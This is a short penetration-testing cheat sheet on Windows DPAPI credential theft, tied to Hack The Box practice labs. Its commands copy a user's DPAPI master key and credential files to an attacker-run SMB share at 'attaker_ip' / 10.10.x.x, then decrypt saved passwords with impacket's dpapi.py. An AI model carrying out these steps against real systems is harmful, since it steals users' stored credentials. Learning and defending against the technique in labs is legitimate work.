---
title: "DPAPI Attack"
date: 2025-11-3 00:00:00 +0800
categories: [AD- Attacks]
tags: [DPAPI Attack]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/dpapi.png
excerpt: "Technical understanding and practical overview"
---

# DpApi attack  
> DPAPI is Windows' built-in encryption system that protects things like saved passwords and Wi-Fi keys. Attackers don't break the encryption - they steal the keys to decrypt it.

# Practise lab's
HTB: Voleur  
HTB: DarkCorp  
HTB: Puppy  
HTB: Vintage 
Hackvent 2024 - Hard  
HTB: Office  
HTB: Sekhmet  
HTB: Access  


## Verify it 
```bash
cmdkey /list
```
### Get the SID
```bash
whoami /all
or
impacket-getpac.py
```
### File Locations
if you go to this location, you will see the files Name like AlphaNumeric-Numbers. we have to download this files.
```bash
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\$SID

C:\Users\<user>\AppData\Roaming\Microsoft\Credentials
```
# For Example:-
```bash
#start a smb server to downk=load the files
sudo impacket-smbserver share ./ -smb2support

#connec the box
net use \\attaker_ip\share

#copy the files
copy C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580 \\10.10.x.x\share
copy C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290 \\10.10.x.x\share

# Extract the Master key
python3 /usr/share/doc/python3-impacket/examples/dpapi.py masterkey -file 0792c32e-48a5-4fe3-8b43-d93d64590580 -password '$password' -sid  S-1-5-21-953262931-566350628-63446256-1001

# Extract the password
python3 /usr/share/doc/python3-impacket/examples/dpapi.py credential -file 51AB168BE4BDB3A603DADE4F8CA81290 -key 0xb360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
```
